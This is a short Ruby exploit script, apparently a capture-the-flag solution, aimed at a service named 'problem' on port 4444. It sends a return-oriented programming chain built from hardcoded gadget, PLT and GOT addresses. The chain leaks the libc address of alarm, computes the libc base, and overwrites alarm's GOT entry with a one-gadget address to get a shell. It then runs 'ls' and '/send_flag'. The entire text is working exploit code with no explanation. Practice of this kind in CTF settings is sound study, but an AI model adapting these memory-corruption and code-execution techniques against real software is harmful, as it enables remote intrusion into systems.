require 'socket'
require 'expect'

sleep 0.1

plt_printf = 0x400ed0
plt_read   = 0x400ff0
plt_alarm  = 0x401060
got_alarm  = 0x6020e8
pop_rdi    = 0x004017e3
pop_rsihoge= 0x004017e1
rel_gadget = 0x4f322
rel_alarm  = 0x00e4840
set_rax    = 0x00401129
pop_rsp_3pop = 0x004017dd
bss = 0x00602800

s = TCPSocket.new('problem', 4444)
sleep 1

rop = [
  set_rax,

  pop_rdi,
  got_alarm,
  plt_printf,

  pop_rsihoge,
  got_alarm,
  0x1234,
  pop_rdi,
  0,
  plt_read,

  pop_rsihoge,
  bss,
  0x1234,
  pop_rdi,
  0,
  plt_read,

  pop_rsp_3pop,
  bss - 8*3,
  0x1234,
  0x1234,
  0x1234,
].pack("Q*")

s.write '0'*8 + [bss].pack("Q")*2 + rop
s.flush
sleep 0.2

a_alarm = s.readpartial(100).tap{|x| p x}.ljust(8, 0.chr).unpack("Q")[0]
libc_base = a_alarm - rel_alarm
a_gadget = libc_base + rel_gadget
p libc_base.to_s(16)

s.write [a_gadget].pack("Q")
s.flush
sleep 0.2

s.write [plt_alarm].pack("Q")
s.flush
sleep 0.2

s.puts 'ls'

s.puts '/send_flag'

s.puts 'exit'

while l=s.gets
  puts l
end
